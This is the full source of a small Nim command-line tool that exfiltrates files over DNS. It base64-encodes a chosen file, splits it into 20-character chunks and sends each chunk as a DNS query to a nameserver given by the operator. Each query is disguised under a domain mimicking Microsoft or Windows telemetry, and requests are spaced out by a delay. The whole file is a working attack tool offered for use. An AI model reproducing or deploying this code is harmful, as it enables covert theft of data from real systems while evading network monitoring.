import std/[os, strutils, random, asyncdispatch]
import pkg/ndns
from base64 import encode
randomize()

proc nDns(ns: string, dnsquery: string) {.async.} =
    let
        header = initHeader(randId(), rd = true)
        client = initDnsClient(ns)
        question = initQuestion(dnsquery, QType.A, QClass.IN)
        msg = initMessage(header, @[question])
        resp = waitFor dnsAsyncQuery(client, msg)

proc dnsExfil(ns: string, target: string, slp: int): void =
    let
        content = readFile(target)
        b64 = encode(content, safe=true).replace("=", "")
        chuckSize = 20 # max 62
        domains = [".client.a.msn.windows.com", ".a.wns.update.windows.com", ".a.wns.o365.microsoft.com", ".msft.a.msn.microsoft.com"]
    
    var stringindex: int

    echo "[+] Sending ", target

    try:
        while stringindex <= b64.len-1:
            let
                query =  b64[stringindex .. (if stringindex + chuckSize - 1 > b64.len - 1: b64.len - 1 else: stringindex + chuckSize - 1)]
                dnsquery = query & sample(domains)
            
            #echo dnsquery
            
            asyncCheck nDns(ns, dnsquery)
            inc(stringindex, chuckSize)
            sleep(slp)
        
        asyncCheck nDns(ns, "quit")
        echo "[+] Done!"
        
    except CatchableError as e:
        echo "[!] Error: ", e.msg

when isMainModule:
    if paramCount() < 3:
        echo "[!] Use: dnx.exe <IP> <File> <Time between requests in ms>"
        echo "[!] e.g: dnx.exe 127.0.0.1 file.pdf 1000"
        quit()
    else:
        dnsExfil(paramStr(1), paramStr(2), parseInt(paramStr(3)))
